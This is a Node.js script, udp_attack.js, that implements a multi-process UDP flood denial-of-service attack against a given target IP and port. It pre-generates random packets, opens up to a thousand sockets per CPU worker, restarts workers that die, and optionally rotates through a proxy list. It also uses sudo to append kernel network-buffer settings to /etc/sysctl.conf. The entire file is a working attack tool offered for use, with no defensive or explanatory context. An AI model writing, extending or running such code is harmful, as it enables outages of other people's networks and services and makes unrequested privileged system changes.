const dgram = require('dgram');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const { Worker } = require('worker_threads');

if (process.argv.length <= 6) {
    console.log("Usage: node udp_attack.js [TARGET_IP] [TARGET_PORT] [DURATION] [PACKET_SIZE] [RATE] [PROXY_FILE]");
    process.exit(-1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const packetSize = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);
const proxyFile = process.argv[7] || '';

// Carrega proxies do arquivo
let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
    try {
        const proxyData = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(line => line.trim());
        proxies = proxyData.map(line => {
            const parts = line.trim().split(':');
            if (parts.length >= 2) {
                return {
                    host: parts[0],
                    port: parseInt(parts[1]),
                    username: parts[2] || null,
                    password: parts[3] || null
                };
            }
            return null;
        }).filter(proxy => proxy !== null);
        
        console.log(`Loaded ${proxies.length} proxies from ${proxyFile}`);
    } catch (error) {
        console.error('Error loading proxy file:', error.message);
    }
}

// Aumenta os limites do sistema para maior desempenho
require('child_process').execSync('echo "net.core.rmem_max = 134217728" | sudo tee -a /etc/sysctl.conf');
require('child_process').execSync('echo "net.core.wmem_max = 134217728" | sudo tee -a /etc/sysctl.conf');
require('child_process').execSync('echo "net.ipv4.udp_mem = 134217728 134217728 134217728" | sudo tee -a /etc/sysctl.conf');
require('child_process').execSync('sudo sysctl -p');

const numCPUs = os.cpus().length;
const ratePerWorker = Math.floor(rate / numCPUs);

if (cluster.isMaster) {
    console.log(`Starting ULTRA ENHANCED UDP attack on ${targetIp}:${targetPort} using ${numCPUs} worker processes`);
    console.log(`Total rate: ${rate} packets/sec, ${ratePerWorker} packets/sec per worker`);
    if (proxies.length > 0) {
        console.log(`Using ${proxies.length} proxies for rotation`);
    }
    
    // Inicia um worker para cada CPU
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork({
            workerId: i,
            workerRate: ratePerWorker
        });
    }
    
    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died, restarting...`);
        cluster.fork({
            workerId: worker.id,
            workerRate: ratePerWorker
        });
    });
} else {
    // Código que cada worker executará
    const workerId = process.env.workerId;
    const workerRate = parseInt(process.env.workerRate);
    
    // Número máximo de sockets por worker (aumentado drasticamente)
    const socketsPerWorker = Math.min(1000, workerRate);
    const sockets = [];
    
    // Pool de pacotes gigante para aproveitar a RAM
    const packetPoolSize = 10000;
    const packetPool = [];
    
    // Pré-gera todos os pacotes
    for (let i = 0; i < packetPoolSize; i++) {
        packetPool.push(crypto.randomBytes(packetSize));
    }
    
    function getRandomPacket() {
        return packetPool[Math.floor(Math.random() * packetPoolSize)];
    }
    
    // Função para obter proxy aleatório
    function getRandomProxy() {
        if (proxies.length === 0) return null;
        return proxies[Math.floor(Math.random() * proxies.length)];
    }
    
    const startTime = Date.now();
    
    // Função de envio ultra acelerada
    async function sendBurst(socketIndex) {
        const socket = sockets[socketIndex];
        
        // Configura socket para máximo desempenho
        socket.setBroadcast(true);
        socket.setTTL(1);
        
        // Aumenta o buffer do socket
        socket.setSendBufferSize(1024 * 1024 * 16); // 16MB
        
        // Taxa de envio massiva
        const packetsPerBurst = Math.ceil(workerRate / socketsPerWorker / 100); // 100 bursts por segundo
        const burstInterval = 10; // 10ms intervalo
        
        // Configura proxy para este socket se disponível
        let currentProxy = getRandomProxy();
        
        const sendInterval = setInterval(() => {
            const now = Date.now();
            if (now - startTime > duration * 1000) {
                clearInterval(sendInterval);
                socket.close();
                if (socketIndex === 0) {
                    console.log(`Worker ${workerId} finished`);
                }
                return;
            }
            
            // Rotaciona proxy mais frequentemente
            if (Math.random() < 0.3 && proxies.length > 0) {
                currentProxy = getRandomProxy();
            }
            
            // Envio massivo de pacotes sem callbacks
            for (let i = 0; i < packetsPerBurst; i++) {
                const packet = getRandomPacket();
                
                if (currentProxy) {
                    // Envia através do proxy sem callback para máximo desempenho
                    socket.send(packet, 0, packet.length, currentProxy.port, currentProxy.host);
                } else {
                    // Envia diretamente
                    socket.send(packet, 0, packet.length, targetPort, targetIp);
                }
            }
        }, burstInterval);
    }
    
    // Cria sockets e inicia envio imediatamente
    for (let i = 0; i < socketsPerWorker; i++) {
        sockets.push(dgram.createSocket('udp4'));
        sendBurst(i);
    }
    
    // Cria threads adicionais para máximo aproveitamento da CPU
    if (workerId == 0) {
        for (let i = 0; i < numCPUs; i++) {
            new Worker(__filename, {
                workerData: {
                    targetIp,
                    targetPort,
                    duration,
                    packetSize,
                    rate: Math.floor(rate / (numCPUs * 2)),
                    proxyFile,
                    isThread: true
                }
            });
        }
    }
}